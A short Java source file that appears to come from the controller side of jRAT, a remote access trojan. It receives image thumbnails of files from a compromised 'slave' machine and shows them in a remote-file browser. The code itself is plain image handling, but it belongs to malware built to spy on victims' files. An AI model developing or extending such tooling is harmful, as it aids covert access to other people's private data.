package jrat.module.fs.packets;

import jrat.common.utils.ImageUtils;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.module.fs.ui.FrameRemoteFiles;

import java.awt.*;
import java.awt.image.BufferedImage;

public class Packet59ThumbnailPreview implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String path = slave.readLine();
		int imageSize = slave.readInt();

		int w = 150;
		int h = 100;

		BufferedImage image = new BufferedImage(w, h, BufferedImage.TYPE_INT_RGB);

		Graphics imageGraphics = image.getGraphics();

		byte[] buffer = new byte[imageSize];
		slave.getDataInputStream().readFully(buffer);

		FrameRemoteFiles frame = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);

		if (frame != null) {
			BufferedImage img = ImageUtils.decodeImage(buffer);
			imageGraphics.drawImage(img, 0, 0, w, h, null);
			frame.getThumbPanel().addImage(path, image);
			frame.getThumbPanel().setProgress(frame.getThumbPanel().getProgress() + 1);
		}
	}

}
